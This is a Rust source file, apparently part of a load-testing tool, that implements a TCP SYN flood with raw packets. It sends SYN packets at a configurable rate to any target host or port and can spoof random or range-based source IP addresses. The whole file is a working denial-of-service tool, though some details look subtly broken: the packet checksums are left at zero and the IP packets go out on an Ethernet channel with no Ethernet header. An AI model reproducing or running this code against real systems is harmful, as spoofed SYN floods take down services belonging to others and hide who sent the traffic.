#[cfg(all(feature = "stress-testing", unix))]
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
#[cfg(all(feature = "stress-testing", unix))]
use std::sync::Arc;
#[cfg(all(feature = "stress-testing", unix))]
use std::time::{Duration, Instant};
#[cfg(all(feature = "stress-testing", unix))]
use anyhow::{Result, anyhow};

#[cfg(all(feature = "stress-testing", unix))]
use pnet::datalink::{self, Channel::Ethernet, Config, NetworkInterface};
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::ip::IpNextHeaderProtocols;
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::ipv4::Ipv4Packet;
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::tcp::{TcpFlags, TcpPacket};
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::Packet;

#[cfg(all(feature = "stress-testing", unix))]
use rand::Rng;

#[cfg(all(feature = "stress-testing", unix))]
use super::{StressConfig, StressStats};
#[cfg(all(feature = "stress-testing", unix))]
use super::metrics::StressMetrics;

#[cfg(all(feature = "stress-testing", unix))]
pub async fn run_syn_flood(config: &StressConfig, metrics: &StressMetrics) -> Result<StressStats> {
    let target_ip = resolve_target(&config.target).await?;
    let target_addr = SocketAddr::new(target_ip, config.port);
    
    let interface = get_network_interface()?;
    let (mut tx, _rx) = create_channel(&interface)?;
    
    let src_ip = if config.spoof_source {
        get_spoofed_source(&config.spoof_range)?
    } else {
        get_local_ip(&interface)?
    };
    
    metrics.start();
    
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    let interval = Duration::from_micros(1_000_000 / config.rate_pps.max(1));
    
    let mut seq_num: u32 = 1000;
    let mut src_port: u16 = 40000;
    
    while start_time.elapsed() < duration {
        if config.random_source_port {
            src_port = rand::random::<u16>() % 20000 + 40000;
        } else {
            src_port = src_port.wrapping_add(1);
        }
        
        let packet = build_syn_packet(
            src_ip,
            src_port,
            target_addr.ip(),
            target_addr.port(),
            seq_num,
        )?;
        
        match tx.send_to(&packet, Some(interface.clone())) {
            Some(Ok(_)) => {
                metrics.record_packet(64);
            }
            Some(Err(e)) => {
                tracing::debug!("Send error: {}", e);
                metrics.record_error();
            }
            None => {
                metrics.record_error();
            }
        }
        
        seq_num = seq_num.wrapping_add(1);
        
        if interval > Duration::ZERO {
            tokio::time::sleep(interval).await;
        }
    }
    
    Ok(metrics.to_stats())
}

#[cfg(all(feature = "stress-testing", unix))]
fn build_syn_packet(
    src_ip: Ipv4Addr,
    src_port: u16,
    dst_ip: IpAddr,
    dst_port: u16,
    seq: u32,
) -> Result<Vec<u8>> {
    use pnet_packet::ipv4::MutableIpv4Packet;
    use pnet_packet::tcp::MutableTcpPacket;
    
    let mut buffer = vec![0u8; 20 + 20];
    
    let mut ipv4_packet = MutableIpv4Packet::new(&mut buffer[..20]).ok_or_else(|| anyhow!("Failed to create IPv4 packet"))?;
    
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(40);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ipv4_packet.set_source(src_ip);
    ipv4_packet.set_destination(match dst_ip {
        IpAddr::V4(ip) => ip,
        IpAddr::V6(_) => anyhow::bail!("IPv6 not supported for SYN flood"),
    });
    
    let mut tcp_packet = MutableTcpPacket::new(&mut buffer[20..]).ok_or_else(|| anyhow!("Failed to create TCP packet"))?;
    
    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_sequence(seq);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(65535);
    tcp_packet.set_checksum(0);
    
    Ok(buffer)
}

#[cfg(all(feature = "stress-testing", unix))]
async fn resolve_target(target: &str) -> Result<IpAddr> {
    if let Ok(ip) = target.parse::<IpAddr>() {
        return Ok(ip);
    }
    
    use trust_dns_resolver::TokioAsyncResolver;
    use std::net::ToSocketAddrs;
    
    let addrs: Vec<_> = (target, 0)
        .to_socket_addrs()?
        .collect();
    
    addrs.first()
        .map(|a| a.ip())
        .ok_or_else(|| anyhow!("Failed to resolve target: {}", target))
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_network_interface() -> Result<NetworkInterface> {
    let interfaces = datalink::interfaces();
    
    interfaces
        .into_iter()
        .find(|iface| {
            iface.is_up() && 
            !iface.is_loopback() && 
            !iface.ips.is_empty()
        })
        .ok_or_else(|| anyhow!("No suitable network interface found"))
}

#[cfg(all(feature = "stress-testing", unix))]
fn create_channel(interface: &NetworkInterface) -> Result<(Box<dyn datalink::DataLinkSender>, Box<dyn datalink::DataLinkReceiver>)> {
    let config = Config::default();
    
    match datalink::channel(interface, config) {
        Ok(Ethernet(tx, rx)) => Ok((tx, rx)),
        Ok(_) => Err(anyhow!("Unsupported channel type")),
        Err(e) => Err(anyhow!("Failed to create channel: {}", e)),
    }
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_local_ip(interface: &NetworkInterface) -> Result<Ipv4Addr> {
    interface
        .ips
        .iter()
        .find_map(|ip| match ip.ip() {
            IpAddr::V4(ip) => Some(ip),
            _ => None,
        })
        .ok_or_else(|| anyhow!("No IPv4 address found on interface"))
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_spoofed_source(range: &Option<String>) -> Result<Ipv4Addr> {
    let mut rng = rand::thread_rng();
    
    if let Some(range_str) = range {
        let parts: Vec<&str> = range_str.split('/').collect();
        if parts.len() == 2 {
            let base: Ipv4Addr = parts[0].parse()?;
            let prefix: u8 = parts[1].parse()?;
            
            let base_u32 = u32::from(base);
            let host_bits = 32 - prefix;
            let offset = rng.gen_range(1..(1u32 << host_bits) - 1);
            
            return Ok(Ipv4Addr::from(base_u32 | offset));
        }
    }
    
    Ok(Ipv4Addr::new(
        rng.gen_range(1..254),
        rng.gen_range(0..254),
        rng.gen_range(0..254),
        rng.gen_range(1..254),
    ))
}

#[cfg(not(all(feature = "stress-testing", unix)))]
pub async fn run_syn_flood(
    _config: &super::StressConfig,
    _metrics: &super::metrics::StressMetrics,
) -> anyhow::Result<super::StressStats> {
    anyhow::bail!("SYN flood requires Unix and 'stress-testing' feature enabled");
}
